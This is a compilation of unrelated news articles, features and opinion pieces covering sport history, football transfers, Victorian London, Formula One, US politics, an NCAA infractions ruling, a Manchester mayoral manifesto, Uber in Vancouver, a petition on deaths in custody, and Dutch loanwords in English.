Spalding, a sports equipment manufacturer who wanted to globalise baseball, formed a committee with English sport's main movers and shakers, including Villa legend William McGregor.
Football, rugby, athletics and even lacrosse teams across the country were invited to join a professional league with the aim of keeping players fit during the summer months.
In the end a four-club competition was formed with Villa competing alongside Preston North End, Stoke City and Derby.
Back then Derby was the only baseball team not already affiliated to a football club – the soccer came later with Derby County FC also inheriting the purpose built Baseball Ground.
Villa's nine-man team was made up of three specialist baseball players, imported from America, a cricketer and three former Villa footballers, Fred Dawson, Joey Simmonds and Arthur Brown.
The other two members were James Cowan a Scottish defender just starting out with the football club, and forward John Devey, who would become a baseball star and Villa's most successful football captain.
“Devey's first exposure as an Aston Villa player was actually on the baseball field, not on the football field, and this was a guy who went on to captain Aston Villa during the 1890s when they won five league titles and two FA Cups,'' says Gray.
“He was the captain when they won the double in 1897. He was one of the all-time Aston Villa greats, who actually played baseball for them first.
‘‘It's worth adding, on John Devey, he was a brilliant baseball player, who led the statistical categories at the end of the year, including being the league's batting champion.”
Devey played a key part in helping Villa to the baseball title which they clinched in the penultimate match, but by then the end was already nigh for the one-season-wonder league.
The traditional British weather rained on the league's parade with crowds at the Perry Barr ground shared with the football club fluctuating between 100 and 1,000 depending on the elements.
League organisers, including McGregor, who is believed to have made a loss, were forced to halve the 6d admission because it was deemed unfair to charge as much for a new sport as for football.
However, the ultimate death knell was the withdrawal of leaders Derby a month before the end following a dispute over whether they could continue to play an all-conquering America pitcher.
Derby's departure led to the competition being mercilessly mocked in the Press, although Villa weren't complaining after holding off a late challenge from Preston to lift the one and only title.
There have since been regional professional leagues in Britain and national amateur leagues, but Villa remain England's only ever champions of a professional league with a nationwide reach.
Whether the football club's subsequent resurgence to the pinnacle of was purely coincidental or not, Gray likes to think that the baseball team pitched in with an exclusive slice of sporting success. “I think the football club was actually in danger of dropping down a division, but three years after the baseball glory, they won the league and then the purple patch started,” added the author. “I think it's pretty safe to say they were the greatest football club in the world in the 1890s, so it's quite nice they were playing baseball right at the start of that decade. It must have helped a little bit with bonding players and fitness, and for bringing John Devey to the club.”

New York City FC are about to reinforce their defensive unit in a major way.
According to New York City FC play-by-play man and ESPN Deportes announcer Roberto Abramowitz, NYCFC is set to sign Athletic Bilbao's Andoni Iraola and 18-year-old Manchester City youth prospect, Angelino (José Ángel Tasande).
Iraola, 32, is a 6′ tall right back and veteran of Athletic Bilbao, where he registered 510 appearances since 2003. He spent two seasons prior to that with Athletic's B-side. Rumored to be leaving the club as early as this past April, he looks all but set to take on duties with NYCFC. He has consistently averaged over 30 appearances per season except for 2015, where he registered 22. In 13 years in La Liga, Iraola has earned 33 goals. He has also been capped by the Spanish National Team seven times.
A natural right fullback, Iraola has also featured as a right midfielder throughout his career.
Joining Iraola is Manchester City Youth product Angelino. A fellow Spaniard, Angelino is a current product of the Manchester City U-21 side. He is a natural left fullback, but can also play on the left midfield and in a more advanced, attacking role. He joined the youth academy in 2013 by way of Deportivo de La Coruna. In 20 U-21 Premier League appearances, he has managed four goals and two assists.
Flexibility is key in MLS players, especially when regarding the stringent roster rules that dominate the league's player acquisition model. Both Iraola and Angelino certainly bring that. With NYCFC missing a true impact player on either of their defensive and offensive wings, Iraola and Angelino bring in fresh blood that will work to compete with the current flank options such as Thomas McNamara, Jeb Brovsky, Josh Williams, Sebastian Velasquez and Ned Grabavoy.
Iraola will likely be signed as a non-DP player while Angelino may come on board on a loan, much like fellow City youth product, Shay Facey. EoS was unable to confirm the arrival of either player at the time of this report.
In the 19th Century, the public's interest in the arts and sciences was enormous. Appropriately, this was symbolized in Queen Victoria and Prince Albert, who spent the better part of their lives supporting the arts and sciences and fully believed that these wonders didn't belong to just the upper classes, but should be shared by everyone. To that extent, plans were drawn up by the Royal Society for the Arts, Manufactures and Commerce for an exhibition to show off technological wonders from around the world.
The exhibition was organised by Society members that included Prince Albert, Henry Cole, Francis Henry, George Wallis, Charles Duke and others. They decided to set the exhibition in Knightsbridge and had the Crystal Palace constructed to house the exhibitions. Over 14,000 of these exhibitions from 15,000 exhibitors were on display covering the Palace's 990,000 square feet. From printing machines that could produce 5,000 copies in an hour (which was a lot back then) to an ancestor of the fax machine developed by Frederick Bakewell, there was plenty to awe the public. Though the initial price to get in was three guineas (or £308.03 in today's money), it eventually lowered to a shilling (£4.89), ensuring that the majority of people could afford to see these wonders.
Eventually the Exhibition closed in October of 1851, but not before 6 million people had passed through it. Instead of the predicted shortfall, the Great Exhibition produced a profit of £186,000, which in today's money would be approximately £23,192,592. This was certainly an encouragement to Albert and the members of the Royal Society who wanted to see the public's exposure to the arts and sciences continue. Prince Albert recommended using the profits made from the Great Exhibition to purchase land along Exhibition Road in South Kensington.
Albert had wanted to transform this area into a centre for the arts, sciences, and technology. Starting in the latter half of the 1850s, construction began on many of the area's institutions, including new buildings for Imperial College London, the Royal College of Art, the Victoria and Albert Museum, the Science Museum, and others. Unfortunately, while Albert's dream was being established in South Kensington, his health was beginning to fail. What began as stomach cramps eventually claimed his life. While his doctors then thought he had caught Typhoid Fever, modern writers often believe that his prior symptoms suggest that Albert may have suffered from Crohn's Disease, renal failure, or abdominal cancer.
On his death, Queen Victoria went into a period of mourning that would last for the remainder of her life. Yet, she was still dedicated to seeing her late husband's dreams come true. The area was given the nickname Albertopolis in his honour. Victoria began work on what would become the Royal Albert Hall, perhaps the premiere classical music venue in London. Later additions to Albertopolis included the Natural History Museum in 1881 and the Imperial Institute in 1887. While the latter changed to the Commonwealth Institute and the original building only has the Queen's Tower remaining (part of Imperial College London), many of the structures that formed this cultural and scientific centre are still there today.
The legacy of the Victorians in the arts, sciences, and technology is still with us. Visiting London, you can attend concerts at the Royal Albert Hall, experience the wonders of science at the Science Museum, view fabulous works of art at the Victoria and Albert Museum, or study the development of species at the Natural History Museum. While the exhibitions the buildings may have changed, walking through them can still grant the sense of wonder felt by the Victorians.
“My world is fire and blood,” murmurs Tom Hardy as “Mad” Max Rockatansky in the latest fan-fueling teaser for George Miller's Mad Max: Fury Road, the first new film in his post-apocalyptic franchise in three decades. The reboot finds loner Max linking up with a group of women, led by Imperator Furiosa (Charlize Theron), who are fleeing across the Wasteland pursued by Immortan Joe (Hugh Keays-Byrne) and his desert thugs.
Battles over oil and water have left humanity fighting over a barren dystopia, Theron gets her own “Come with me if you want to live” moment, and X-Men's Nicholas Hoult is unrecognizable as a young road warrior named Nux in the peek, which ends with another look at that desert fire tornado chase that had fanboys and girls panting at Comic-Con. “I was able to make the movie I wanted to make,” Miller told the Hall H crowd in July of the long-gestating $100M+ actioner. “WB allows the filmmakers their process.”

LONDON (AP) Formula One's new owners plan to add a street race in the United States in an attempt to improve a sport which they feel stagnated under Bernie Ecclestone's control.
Chase Carey, who ended Ecclestone's four-decade reign as F1's chief executive, told The Associated Press on Tuesday that the sport will no longer be run as a “one-man show.”
Carey, though, will be as dogged as the 86-year-old Ecclestone in negotiations with circuits, insisting that less-lucrative races in heartlands like Britain will have to prove they can become more profitable rather than being allowed to renegotiate hosting fees.
International sports and entertainment firm Liberty Media, which is controlled by 75-year-old tycoon John Malone, completed its takeover of F1 on Monday from investment fund CVC Capital Partners.
Driving growth in the United States is seen as a priority for Liberty, which also owns baseball's Atlanta Braves and has investments in cable TV companies. F1 currently only makes one stop during the season in the United Sates – to Austin, Texas – but adding a street race is high on Liberty's agenda.
“We would like to add a destination race in the U.S. in a location like New York, L.A., Miami, Las Vegas,” Carey said in a telephone interview. “We think we can create something that will be a really special event. Obviously the U.S. is all upsides for us. We haven't invested in the way we need to build the U.S. market.”
The sport has remained stuck in the past, making “events feel a little tired,” while the modern media landscape was not grasped by Ecclestone, according to Carey.
“Bernie really ran a one-man show,” Carey said. “I don't plan to run a one-man show.”
Although Ecclestone remains on board as an honorary chairman and will be an F1 adviser, power clearly now rests with Carey, who is a veteran Fox executive.
“The last half dozen years I think the business has not reached its potential,” Carey said. “With all the things you need to do to be competitive in an increasingly fragmented online world, you need an organization doing many things at the same time.”
Ecclestone was criticized for overlooking historic popular race venues to move into new, wealthier markets including Abu Dhabi, Bahrain and Azerbaijan, which held its first race last year. The German Grand Prix has been dropped from the 2017 calendar because of Hockenheim's financial difficulties, while the British race at Silverstone is at risk because of hosting costs.
“Western Europe is important for us and to some degree we have to engage to make those races bigger and better than they are while respecting their heritage,” Carey said, while ruling out cut-price deals to keep historic races.
“We are willing to invest in the sport but we are the new guys so everyone wants to come in and figure it's a chance to renegotiate. So I don't think that's the right mindset. We think these races (in places like Britain and Germany) should be bigger and more profitable and we are willing to work with promoters to figure out how to achieve that. That's our goal.”
The takeover, which gives F1 an enterprise value of $8 billion and an equity value of $4.4 billion, comes as the series is poised for a shakeup.
Changes such as wider tires, car design, louder engines, and more overtaking opportunities are set to make F1 more exciting in a bid to win back a large chunk of unhappy fans amid flagging attendances at some races.
“We can certainly do things to make the race day more engaging, more exciting – make the race itself more exciting,” Carey said. “I have gone around and talked to a lot of people and hear many of the same things about predictability, rules too complicated, engineers overtaking drivers, the engines could be faster, louder, cheaper.
“And so there are a number of things we can do to improve the race, the race day.”
Such as tapping into the “excitement and buzz” found at the NFL's showpiece game and turning races into week-long festivals in host cities.
“What I would like to have is 21 Super Bowls,” Carey said. “Priority 1 is to make the races bigger and better. We have some great races like Singapore, Mexico and Abu Dhabi but we have to make all the races have an energy and excitement that really makes them unique events.”

I've been to this dinner many times. Never saw anyone get booed this way during a speech. — Maggie Haberman (@maggieNYT) October 21, 2016
Wow @realDonaldTrump is creating a really awkward situation at the Al Smith dinner. People are not laughing. #Yikes — Katie Couric (@katiecouric) October 21, 2016
#Yikes indeed. Trump bombed big league, to use his favorite phrase, and he did so on his home turf, surrounded by the members of the New York elite he's always yearned to be part of. It was a high-profile, high-society humiliation just over two weeks before the election, and it brings Trump full circle from the night of comedy when, some suspect, he resolved to run for president: the 2011 White House Correspondents Dinner.
At that dinner, Seth Meyers had the line of the night: “Donald Trump has been saying that he will run for president as a Republican, which is surprising since I just assumed he was running as a joke.” But President Barack Obama's extended ridicule of Trump's conspiracy-mongering was more devastating:
Now, I know that he's taken some flak lately but no one is prouder to put this birth certificate matter to rest than The Donald. And that's because he can finally get back to focusing on the issues that matter, like, did we fake the moon landing? What really happened in Roswell? And where are Biggie and Tupac?
The irony of Thursday night's debacle was that Trump did it to himself. BuzzFeed has a senior Trump source saying he wrote the speech on his own. There's reason to be skeptical—some of Trump's early jokes were good and frankly didn't sound like him—but it's certainly plausible that he was the driving force, given some key lines in the text.
“You know, last night, I called Hillary a nasty woman,” Trump said, inexplicably bringing up one of his worst moments in Wednesday's debate. “After listening to Hillary rattle on and on and on, I don't think so badly of Rosie O'Donnell anymore.”
For her part, Clinton gave a much more traditional Al Smith speech, roasting Trump but staying within the bounds of good taste. “After listening to your speech,” she joked, “I will also look forward to listening to Mike Pence deny that you ever gave it.”
How do you get a 45,000 pound plane up to launch speed on a 270-foot aircraft carrier runway? With a giant, steam-powered catapults of course. Jörg Sprave would be so proud.
The modern aircraft catapult, part of the CATOBAR (Catapult Assisted Take Off But Arrested Recovery) system, consists of a towbar, which attaches to the landing gear under the plane's nose, connected to a shuttle. The shuttle then connects to a metal lug that pokes up through a slit in the deck and is itself attached to a pair of below-deck pistons. These pistons sit in parallel cylinders, 18-inch diameter and about 100 yards long, which are "charged" with high-pressure steam from the carrier's reactors.

Once the cylinders are sufficiently charged—too little pressure and the plane takes a dip in the ocean, too much pressure and the shuttle will rip the front end of the plane off—the aircraft opens up its throttle (for added thrust) and the catapult officer releases a lock on the pistons. This causes the pistons to slam forward, accelerating the plane down the runway and off the end of the carrier—going from 0 to 165 MPH in two seconds.
To keep the shuttle from simply careening into the end of its track (or clear into the ocean) at 165 MPH, carriers employ a water brake system to slow it down with out damage. This consists of a horizontal dashpot filled with aerated seawater. The resistance this water provides slows and eventually stops the charging pistons.

The partition of India led to one of the largest mass migrations in modern history, with millions seeking sanctuary from violence in ancient tombs and forts, which were transformed into sprawling refugee camps.
More than 15 million people were displaced after India gained independence from Britain in 1947, with Muslims heading towards the newly formed Pakistan as Hindus and Sikhs moved in the opposite direction.

Download the 2016 Notre Dame Public Infractions Decision
A former University of Notre Dame athletic training student violated NCAA ethical conduct rules when she committed academic misconduct for two football student-athletes and provided six other football student-athletes with impermissible academic extra benefits, according to a Division I Committee on Infractions panel. One additional football student-athlete committed academic misconduct on his own.
The panel prescribed one year of probation, a two-year show-cause order and disassociation for the former athletic training student, and a $5,000 fine for the university. During that time, if a member school hires the former athletic training student in an athletically related position, she and the school must appear before a Committee on Infractions panel.
This case was resolved through the summary disposition process, a cooperative effort during which the involved parties collectively submit the case to the Committee on Infractions in written form. The NCAA enforcement staff, university and involved individuals must agree to the facts and overall level of the case to use this process instead of a formal hearing. The panel reviewing the case held an expedited penalty hearing because the university did not agree with one of the penalties.
During two academic years, the former athletic training student and two football student-athletes engaged in academic misconduct when the former athletic training student completed coursework for the student-athletes. These student-athletes, in addition to a third football student-athlete, also committed academic misconduct individually. The university determined the three student-athletes violated its academic integrity policies. The misconduct resulted in the student-athletes playing while ineligible — one student-athlete during the 2012-13 season and the other two student-athletes during the 2013-14 season.
The former athletic training student also provided impermissible academic assistance to six additional football student-athletes in a total of 18 classes. She provided the assistance while she attended the university and a year after she graduated. Two of the student-athletes violated the university's academic integrity policies. The remaining four student-athletes were not enrolled at the time the violations were discovered, so they were not subject to the university's policies.
The panel found the former athletic training student violated NCAA ethical conduct rules when she committed academic misconduct and provided the impermissible academic extra benefits. She signed documents outlining that she should not complete academic work for student-athletes, but the panel noted she provided the assistance and did not ask the university's compliance representatives if her actions would violate university and NCAA rules.
Penalties prescribed by the panel include the following:
Public reprimand and censure for the university.
One year of probation from Nov. 22, 2016, through Nov. 21, 2017.
A two-year show-cause order for the former athletic training student from Nov. 22, 2016, through Nov. 21, 2018. During that time, any NCAA member school that hires her in an athletically related position must appear with her before a Committee on Infractions panel.
A disassociation of the former athletic training student from the university's athletics program from Nov. 22, 2016, through Nov. 21, 2018. During this period, the university may not accept assistance in the recruitment of prospects or support of student-athletes from the former athletic training student; may not accept donations to the athletics program from the former athletic training student; may not extend athletics benefits or privilege to the former athletic training student that is not generally available to the public; and must ensure the former athletic training student is not involved in the university's athletics program.
A vacation of all records in which student-athletes participated while ineligible during the 2012-13 and 2013-14 football seasons.
A $5,000 fine.
Members of the Committee on Infractions are drawn from NCAA membership and members of the public. The members of the panel who reviewed this case are Gregory Christopher, athletics director at Xavier University; Thomas Hill, senior policy advisor to the president of Iowa State University; Gregory Sankey, chief hearing officer for this panel, chair of the Committee on Infractions and commissioner for the Southeastern Conference; Larry Parkinson, director of enforcement for the Federal Energy Regulatory Commission; and Sankar Suryanarayan, university counsel, Princeton University.

Andy Burnham has launched his mayoral manifesto with a love-letter to ‘radical' Manchester – and to a soundtrack of Oasis, James and the Stone Roses.
The Leigh MP declared music legend Tony Wilson his ‘inspiration' at an event in Newton Heath, at which he outlined a raft of policies aimed at echoing the region's revolutionary history.
An array of Manchester iconography formed the backdrop at the Sharp Project, where people who had contributed to his manifesto had been invited to hear the results.
He said the ‘radical' spirit of the city ‘runs through every single page' of the document, which he said had been formed after months of speaking to ordinary people in a bid to create what he termed ‘our manifesto'.
(Image: Manchester Evening News)
Guests were ushered into the auditorium to the sounds of Sit Down by James, followed by Oasis b-side Half the World Away and a video of iconic moments, set to Stone Roses hit This is the One.
The compilation ran through some of Greater Manchester's most defining images, including the birth of women's suffrage, the IRA bomb and its aftermath, and both United and City's grounds, as well as news coverage of the former shadow health secretary's decision to stand.
Mr Burnham told assembled supporters: “As the song said, this is the one we've been waiting for. This is a big moment in the history of our country and if anywhere can rise to this moment it's Greater Manchester.”
He said the region was a ‘great place', with ‘great people' and ‘a great history', as well as ‘wonderful values', adding: “I believe it now truly stands on the brink of a great era.”
Paying tribute to Madchester-era legend Tony Wilson – whom he said had been a friend – he told supporters the pair had first shared a commitment to devolution in the early 2000s, when they worked on the campaign to introduce a north west regional assembly.
“Going back 15 years ago Tony and I worked on devolution, the forerunner if you like to the campaign we're involved in now,” he said.
“We tried and we tried to build a campaign and I remember in that time being really influenced by Tony's passion for devolution and what he felt we could do, the real sense we had that Greater Manchester – indeed the north west of England – had been held back by our political structure.”
(Image: Manchester Evening News)
Mr Burnham's 10-page manifesto also quotes Tony Wilson as saying ‘this is Manchester – we do things differently here'.
Most of the pledges contained within the document had been announced in the run-up to today's launch – and cover policies from early years to old age, transport, climate change, housing, homelessness, mental health, health and social care, equality, loneliness and north collaboration.
Some, including his plan to roll out free bus passes for 16-18-year-olds, require a substantial amount of investment.
But Mr Burnham told the M.E.N. afterwards that the entire manifesto had ‘all been costed', including the bus passes, which will come with an annual price tage of at least £20m.
The passes could be provided thanks to new bus legislation currently going through Parliament, he said, which would allow leaders to squeeze more cash out of bus operators.
It would also come partly from existing college funding and from his plans to create a new apprenticeship scheme, that would use a university-style application system to allow young people to apply.
“But the main way we will fund it is by the new leverage we will get through the bus services bill, because we get the ability to set the terms of the market, to say this is what we expect, this is what we want,” he said.
“We will say [to operators] we expect a free bus pass for 16-18-year-olds across Greater Manchester – if you want to provide bus services here you've got to make sure some of those profits you've been taking for yourself in the last 20 or 30 years are coming back to support young people here.”
He said that would then also lead to a saving within the benefits system.
(Image: Manchester Evening News)
On another key policy pledge – ending rough sleeping by 2020 – he admitted there was not a lot of public money with which to fund it.
Therefore it was a ‘risk', he admitted, but revealed he had already had his own personal £15,000 pledge to the pot matched by five or six other donors.
Elsewhere in the manifesto he promised a crackdown on ‘absent' and rogue landlords.
The sector would be expected to sign up to a Greater Manchester-wide register – voluntarily – to help oversee the quality of private rentals.
Absent landlords in his own constituency ‘drag the whole community' down, he said, adding to anyone who did not register: “Respect our communities or get out of Greater Manchester.”
The manifesto also references plans to plough more devolved cash into affordable housing, seek extra powers over schools and early years and launch summits on pollution and loneliness.
Mr Burnham said the manifesto was not about him but about the entire community, adding: “The word ‘I' does not appear in it. That's how intend to work if I'm elected come the fourth of May.”
The adventures of Florida Man continue. A teenage Honda driver was nailed by the cops after a brief chase in St. Petersburg, Florida, earlier this month—only to claim that he never noticed the lights and sirens behind him, so desperate was he to reach his girlfriend and get lucky.
According to Pinellas County court documents brought to light by The Smoking Gun, a police officer in an unmarked patrol car spotted 18-year-old Ruben Hughes driving recklessly blasting through a residential neighborhood in his 2005 Honda Accord on the night of December 1st. The officer flipped on his lights and siren and sped off in pursuit—only to see the Florida man accelerate away, "ignoring my emergency equipment," according to the report. The pursuing officer radioed in the car's description, enabling other units to keep tabs on the vehicle.
Eventually, Hughes came to a stop several blocks away from the initial location where the officer lit him up. After being read his rights, however, Hughes reportedly offered up an explanation for his brief dash away from the law: He claimed he never even noticed the lights and siren behind him, as he was hustling off with extreme dedication to, as the court report put it, "meet his girlfriend for relations."
According to Uber CEO and cofounder Travis Kalanick, Vancouer is the only city that Uber has had to back out of.
So when Techvibes was invited by Launch Academy and SheTalks to cover a fireside chat with Kalanick in advance of his TED Conference talk, we had to attend.
While the intimate conversation covered topics including the entrepreur's journey, Uber's use of data, gender imbalance in tech, and self-driving cars, everyone in the room was eager to get his thoughts on cracking the Vancouver market once and for all.
“I usually ask, who came here in an Uber?” Kalanick opened. “That question doesn't work out so well here in Vancouver.”
Uber has successfully launched in Canada in Montreal, Toronto, and Edmonton but through all its aggressive international expansion, just one attempt has been a true failure for Uber: Vancouver.
Uber expanded into Vancouver in 2012 but was quickly stopped by the Passenger Transportation Board of British Columbia (PTB).
The Vancouver Limousine industry is governed by the PTB and in Vancouver the PTB have set a minimum rate for any trip of $75—regardless of distance or time travelled. Consequently, Uber backed out as the minimum made it impossible for drivers to get riders and earn a sustainable living.
RELATED: Will Quebec Finally Legalize Uber – Or Just Ban It Altogether?
Despite this “old rule,” Kalanick believes that the City of Vancouver will “eventually make the leap” and his reasons should not fall on deaf ears considering our goal to be the Greenest City.
“It's straightforward,” he said. “It does start with a high quality service for the lowest possible price. What that means is I can push a button and reliably get where I need to go when I want to. And if you can do it at a really cost effective price it means people don't have to own cars.”
“And when people don't have to own cars then the first thing that happens is the parking situation in the city gets much better. In cities across North America, 30% of the land is used to store these cars that we sit in for only 4% of the day. And so you have whole structures, instead of parks, hospitals, and day care centres. And where all the great things that we could have in our cities there are hunks of cement storing hunks of steel,” Kalanick said.
He went on to sum up the Vancouver argument in a way that few will be able to debate.
“I would say if you want to create jobs, if you don't like traffic, if you don't like drunk driving, if you don't like pollution, then I think Uber is a good solution for Vancouver,” he concluded.
The election of Donald Trump allowed many to hope for a change in US foreign policy. However, recent statements by Mr. Trump give reason to believe that crucial lessons have yet to be learned in Washington when it comes to international law.
It is of course impossible at this stage to know if the new president is a man given to making inflammatory pronouncements in support of the image of a tough, no-nonsense president for whom at home and overseas it will be a case of my way or no way; or if they are the product of his lack of experience in politics and thus can be ascribed to ignorance.
Regardless of the reasons, his most recent comments regarding Iraq and Syria are shockingly and alarmingly dangerous.
On Iraq, during an interview on the US ABC television network, Trump said: “We should have kept the oil when we got out” of Iraq.

Here he was merely repeating what he said during a speech he gave at CIA headquarters in Langley, Virginia, confirming that it is a position he firmly holds and one that presumably he shares with his team and close advisers. In fact, during the speech he went further and suggested “maybe we'll have another chance [to take ownership of Iraq's oil].”
Let us be clear: the expropriation of Iraq's oil by the United States would constitute a clear and flagrant breach of international law. Indeed, it would be an act of international and colonial piracy redolent of the 19th century, one that would be resisted to the death by the Iraqi people as an insult to their national sovereignty and dignity. In fact, if the Trump administration were actually to attempt to follow through on such an objective, it would succeed in uniting the Sunni and Shia of Iraq in a way they have never been united in their history.
Not satisfied with outrageous comments on Iraq, Trump also recently mooted the prospect of the US establishing “safe zones” in Syria. "I'll absolutely do safe zones in Syria for the people,” he said.
The Reuters news agency reported that his administration is intent on instructing the Pentagon and State Department to come up with a plan for setting up said “safe zones” in the country.
Perhaps Donald Trump has been asleep these past six years. How else to explain the extent of his ignorance of the conflict in Syria. To remind him, it is a conflict that has involved the Syrian people and government, in conjunction with their Iranian and Russian allies, writing a new page in the annals of determination, courage, and tenacity against the most brutal and barbaric menace the world has seen since the Khmer Rouge in Cambodia in the 1970s – a menace supported by US regional allies such as Saudi Arabia, Qatar, and Turkey. And it is a struggle they have waged, and in which thousands have given their lives, in defense of Syria's independence, freedom, and national sovereignty.
Does President Trump really believe the Syrian people or Russia would stand by while Washington attempts to impose “safe zones” on Syrian territory in violation of international law? To ask this question is to answer it. What Trump is advocating here places the US on a collision course with Russia, thus ending any illusions that his election may have marked a rejection of the 'might is right' fantasies of the neoconservative hawks who went before.
Two places where no one is harboring any illusions when it comes to Donald Trump's presidency are Beijing and Tehran. On the contrary, both China and Iran are girding themselves for the very real prospect of military conflict with the US going forward.
In a recent editorial in the China Daily, the country's state-owned newspaper, the Foreign Ministry spokesman Hua Chunyin, issued a warning to President Trump over his bellicose and saber rattling threats against the People's Republic over the ongoing territorial dispute in the South China Sea.
Mr. Chunying said, “China's determination to protect its own territory and sovereignty will remain unchanged, regardless of what other countries say or what changes occur.”
Throughout his election campaign, Trump had some harsh words to say concerning China, in the process dredging up the kind of ‘Yellow Peril' tropes popular in the 1950s and 60s. He accused Beijing of effectively undermining the US economy with currency manipulation and other such inscrutable and devious practices.
However, the claim that China is engaged in currency manipulation is disputed by no less a newspaper than the conservative Wall Street Journal, which the last time anyone checked is not the in-house newspaper of the Communist Party of China.
The U.S. must stop supporting terrorists who are destroying Syria and her people.https://t.co/Gngsh01XCB — Tulsi Gabbard (@TulsiGabbard) January 26, 2017
So what is Trump's game when it comes to Beijing? Is it bombast and bluster with the objective of negotiating a more favorable trade relationship with a country whose economic growth relative to the US continues to be phenomenal? Or is it more than that? Is the path of hostility and confrontation with China being taken as part of a strategy to split Russia's alliance with the People's Republic – i.e. an attempt to place Russia in the invidious position of choosing between positive relations with Washington at China's expense, or vice-versa?
One still clings onto the hope, of course, that rather than any of the aforementioned, what we are being treated to is a billionaire who never in his wildest dreams expected to become the leader of the ‘free world' and as such is merely giddy with the trappings of power - kind of like a child on Christmas morning with a new train set. If so then it is hoped we can put his inflammatory statements down to inexperience and over exuberance.
However, it would be folly of the most naïve kind not to take the words and statements that have and continue to issue from the lips of the US president at face value. It is why a note of caution where his leadership is concerned must now be struck.
Ultimately, when it comes to President Trump, we may soon be faced with the hard reality that rather than his leadership proving a case of meet the new boss ‘same' as the old boss; it may turn out to be a case of meet the new boss ‘worse' than the old boss.
Sign the petition to the Department of Justice: We will not back down until law enforcement agencies report all deaths of people in custody.
To: Department of Justice Attorney General Loretta Lynch and the future attorneys general
Although we will never forget the names of Freddie Gray or Sandra Bland, we will never know the names of the vast majority of people who die while held by law enforcement agencies (LEAs). We don't even know how many there are. This is unacceptable and legally preventable.
LEAs need to report all deaths of people while in custody. Without this information it is impossible to demonstrate how pervasive the problem is. It's also difficult to pass legislation to help communities facing LEAs with no transparency or accountability.
To address this problem the American people are demanding that the Death in Custody Reporting Act (DCRA) and the Arrest-Related Deaths (ARD) program be enforced to the full extent of the law immediately.
The data collected by these laws will a) remove the shroud of secrecy from deaths of people in custody, b) prevent people's deaths, and c) provide much-needed accountability and transparency to the public, especially people who have lost loved ones who've died during arrest or in custody.
Right now, law enforcement agencies that don't report deaths of people while in custody or during arrest are violating laws, which have existed since 2000. The Death in Custody Reporting Act (DCRA) and the Arrest-Related Deaths (ARD) program are simply not enforced.
Sign the petition to tell the Department of Justice loud and clear: DCRA and the ARD program must immediately be enforced to the full extent of the law.
These laws give the Attorney General the discretion to withhold law enforcement funding from states whose LEAs do not properly report all deaths during arrest or in custody. They could face lost funding for equipment and tactical resources; this should be a motivator to report people's deaths.
The data collected by mandatory reporting under DCRA and ARD will be instrumental in passing legislation that transforms the criminal justice system. It will mean fewer lost lives and justice for families who have lost loved ones.
Every Case Matters, a group of determined mothers, will visit the Department of Justice in January to demand justice for their children killed by police. They are demanding information and records regarding their children's deaths and they want the killers to be tried for murder.
One simple step the DOJ can take right now is enforcing existing DCRA and ARD laws. The data collected by these laws can remove the shroud of secrecy from deaths of people in custody and lead to the answers these mothers deserve.
Sign the petition: The Department of Justice must enforce DCRA and ARD to the full extent of the law.
Language is a ragbag of terms and phrases that are handed down, created or borrowed over a long period of time. A loanword is a term adopted from a donor language and incorporated into a recipient language without translation. Loanwords are immigrants. They arrive in alien surroundings, adapt to the new vocabulary, integrate and become domesticated (spelling, pronunciation, etc.), at times losing part of their original meaning. In English, loanwords (mostly nouns) appear in a variety of contexts, such as trade, art, fashion, food, technology, war, etc. Such words tend to be taken from a field of activity where the foreign culture has a dominant role, hence the many Italian words in the sphere of music and opera, or French terms in that of ballet.
When the Merchant Adventurers set up headquarters Bruges in 1344, it marked the beginning of a long period of commercial and artistic interaction between the Low Countries and England. Contacts were intense. In order to defend their interests, foreign merchants united in ‘Hansen', including the powerful ‘Flemish Hanse of London'. From 1463 to 1469 William Caxton stayed in Bruges as governor of the Merchant Adventurers. He learned the art of printing in Flanders and, on his return, installed the first printing press near Westminster Abbey in 1476. Later, when Elizabeth I provided a safe haven to Protestants from the Low Countries who had escaped Spanish persecution, the country received their skilled industry and commercial experience in return. Refugees introduced new trades to local economies, such as Canterbury silks, Norwich stuffs, or Yarmouth herring. Flemish and Dutch professional craftsmen and artists were enticed to cross the Channel. English ambassadors in the Low Countries functioned as industrial and artistic ‘spies'. The brain drain existed long before the term was invented. It is clear from Johan Frederik Bense's impressive Dictionary of the Low-Dutch Element in the English Vocabulary (1926) that many early words borrowed from Flemish/Dutch belong to the economic and commercial domains.
In 1519, Jan Ympyn returned from a twelve years stay in Venice where he had been sent by his merchant father to learn commercial practices and the art of bookkeeping. Ympyn settled in Antwerp where he prospered as an exporter of silks, woollens, and tapestries. Much of his business was directed towards England. Today he is remembered as the author of the first Flemish manual on bookkeeping, entitled Nieuwe instructie ende bewijs der looffelijcker consten des rekenboecks, published posthumously in Antwerp in 1543. Four years later this manual was translated into English as A Notable … Woorke, Expressyng and Declaryng the Forme how to Kepe a Boke of Accomptes or Reconynges. The last word is literally adopted from the Dutch/Flemish word ‘rekening'. Reckoning is one of those loanwords that in the course of time began a ‘life of its own'. This book is the oldest extant text on accounting in English. It has been suggested that merchant and financier Thomas Gresham, resident in Brussels in 1543, had been responsible for the translation, but the claim has not been substantiated.
Under the Treaty of Nonsuch in 1585, Elizabeth I decided to intervene directly in the war between the United Provinces and Spain. She sent Robert Dudley, Earl of Leicester, with some 5,000 troops to assist the Dutch. For years to come, English troops were stationed in Flushing (Vlissingen). During the eighty years of struggle many new weapons, strategies, systems of fortification, and other innovations in the art of warfare were introduced. To British soldiers and mercenaries, the Dutch experience was crucial in their personal career development. The first substantial Dutch-English dictionary (31,000 entries) was compiled by the soldier and scholar Henry Hexham in 1648 and is entitled A Copious English and Netherduytch Dictionarie. He was responsible for introducing many Dutch military terms into the English vocabulary, including booty (buit), beleaguer (belegeren), quarter-master (kwartiermeester), knapsack (knapzak), plunder (plunderen), and tattoo (taptoe).
In 1598, Richard Haydocke, former English ambassador to The Hague, translated Paola Lomazzo's Trattato del'arte della pittura. Searching for an English equivalent for the Italian paese, he recalled the word landschap from conversations with artists in the Low Countries, the second syllable in the word being derived from scheppen (to create). His Tracte Containing the Artes of Curious Paintinge introduced a new set of terms in the vocabulary of the English art critic, first landscape, soon to be followed by seascape, cloudscape, riverscape, and townscape, all terms conjuring up the image of the Flemish or Dutch artist contemplating his surroundings and creating scenery, clouds, rivers and urban views in paint.
